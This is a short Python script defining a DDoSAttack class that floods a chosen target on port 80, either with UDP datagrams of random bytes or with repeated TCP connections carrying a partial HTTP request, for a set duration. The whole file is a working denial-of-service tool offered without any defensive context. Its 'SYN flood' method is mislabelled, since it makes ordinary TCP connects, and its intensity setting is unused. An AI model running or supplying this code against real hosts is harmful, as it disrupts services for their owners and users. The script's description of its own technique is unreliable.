import socket
import threading
import random
import time

class DDoSAttack:
    def __init__(self, target, attack_type, duration, intensity):
        self.target = target
        self.attack_type = attack_type
        self.duration = duration
        self.intensity = intensity
        self.stopped = False

    def udp_flood_attack(self):
        while not self.stopped:
            try:
                udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                udp_socket.connect((self.target, 80))
                data = random._urandom(1024)
                udp_socket.send(data)
            except socket.error:
                pass

    def syn_flood_attack(self):
        while not self.stopped:
            try:
                syn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_socket.connect((self.target, 80))
                syn_socket.send(b'GET / HTTP/1.1\r\n')
            except socket.error:
                pass

    def start_attack(self):
        if self.attack_type == 'UDP':
            attack_thread = threading.Thread(target=self.udp_flood_attack)
        elif self.attack_type == 'SYN':
            attack_thread = threading.Thread(target=self.syn_flood_attack)
        attack_thread.start()
        time.sleep(self.duration)
        self.stopped = True
        attack_thread.join()